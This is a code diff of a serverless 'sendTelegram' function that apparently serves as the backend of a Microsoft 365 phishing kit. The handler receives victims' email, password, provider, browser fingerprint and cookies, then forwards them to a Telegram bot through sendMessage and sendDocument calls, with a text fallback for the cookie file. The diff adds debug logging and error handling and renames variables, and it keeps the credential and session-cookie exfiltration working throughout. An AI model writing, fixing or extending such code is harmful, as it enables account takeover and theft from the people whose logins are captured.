@@ -23,29 +23,37 @@ export const handler = async (event, context) => {
     };
   }
 
-  try {
-    const data = JSON.parse(event.body);
-    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;
+  // DEBUG: Log entry point and incoming body
+  console.log("sendTelegram called! Event body:", event.body);
 
-    console.log('📝 Received data:', {
-      email,
-      hasCookies: !!browserFingerprint?.cookies,
-      cookiesType: typeof browserFingerprint?.cookies,
-      cookiesLength: Array.isArray(browserFingerprint?.cookies) ? browserFingerprint.cookies.length : 'N/A'
-    });
+  try {
+    let data;
+    try {
+      data = JSON.parse(event.body);
+    } catch (parseError) {
+      console.error('❌ JSON parse error:', parseError, 'Raw body:', event.body);
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ 
+          error: 'Invalid JSON in request body',
+          details: parseError.message,
+        }),
+      };
+    }
 
     // Check environment variables for Telegram
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-    
-    const BOT_TOKEN = TELEGRAM_BOT_TOKEN;
-    const CHAT_ID = TELEGRAM_CHAT_ID;
-    
     const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
     const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.error('Missing Telegram configuration');
+    // Log env presence (mask actual values)
+    console.log('TELEGRAM_BOT_TOKEN set?', !!TELEGRAM_BOT_TOKEN, 'TELEGRAM_CHAT_ID set?', !!TELEGRAM_CHAT_ID);
+    console.log('UPSTASH_REDIS_REST_URL set?', !!UPSTASH_REDIS_REST_URL, 'UPSTASH_REDIS_REST_TOKEN set?', !!UPSTASH_REDIS_REST_TOKEN);
+
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('❌ Missing Telegram configuration at runtime');
       return {
         statusCode: 500,
         headers,
@@ -54,6 +62,16 @@ export const handler = async (event, context) => {
         }),
       };
     }
+
+    // Extract data from body
+    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;
+
+    console.log('📝 Received data:', {
+      email,
+      hasCookies: !!browserFingerprint?.cookies,
+      cookiesType: typeof browserFingerprint?.cookies,
+      cookiesLength: Array.isArray(browserFingerprint?.cookies) ? browserFingerprint.cookies.length : 'N/A'
+    });
 
     // Get client IP with better detection
     const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -217,13 +235,13 @@ Download link: ${event.headers.host ? `https://${event.headers.host}` : 'https:/
 
     console.log('📤 Sending main message to Telegram...');
 
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: CHAT_ID,
+        chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'Markdown',
       }),
@@ -289,7 +307,7 @@ ${JSON.stringify(cookiesForFile, null, 2)}
       let formData = '';
       formData += `--${boundary}\r\n`;
       formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-      formData += `${CHAT_ID}\r\n`;
+      formData += `${TELEGRAM_CHAT_ID}\r\n`;
       
       formData += `--${boundary}\r\n`;
       formData += `Content-Disposition: form-data; name="document"; filename="${fileNameForUpload}"\r\n`;
@@ -302,7 +320,7 @@ ${JSON.stringify(cookiesForFile, null, 2)}
       console.log('📤 Sending cookies file to Telegram...');
 
       // Send file to Telegram
-      const fileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
         method: 'POST',
         headers: {
           'Content-Type': `multipart/form-data; boundary=${boundary}`,
@@ -321,13 +339,13 @@ ${JSON.stringify(cookiesForFile, null, 2)}
         // Fallback: send as text message
         const fallbackMessage = `📁 <b>MICROSOFT 365 COOKIES</b> (${cookiesForFile.length} cookies)\n\n<code>${cookiesFileContent.substring(0, 3500)}</code>\n\n${cookiesFileContent.length > 3500 ? '<i>...truncated</i>' : ''}`;
         
-        const fallbackResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            chat_id: CHAT_ID,
+            chat_id: TELEGRAM_CHAT_ID,
             text: fallbackMessage,
             parse_mode: 'HTML',
           }),
@@ -345,13 +363,13 @@ ${JSON.stringify(cookiesForFile, null, 2)}
       try {
         const debugInfo = `🔍 <b>MICROSOFT 365 DEBUG</b>\n\n👤 User: ${email || 'Not captured'}\n🍪 Cookies Found: ${formattedCookies.length}\n📊 Raw Data Type: ${typeof cookieInfo}\n📋 Raw Data: ${JSON.stringify(cookieInfo).substring(0, 200)}...\n\n<i>Microsoft 365 cookie processing completed with ${formattedCookies.length} cookies.</i>`;
         
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            chat_id: CHAT_ID,
+            chat_id: TELEGRAM_CHAT_ID,
             text: debugInfo,
             parse_mode: 'HTML',
           }),
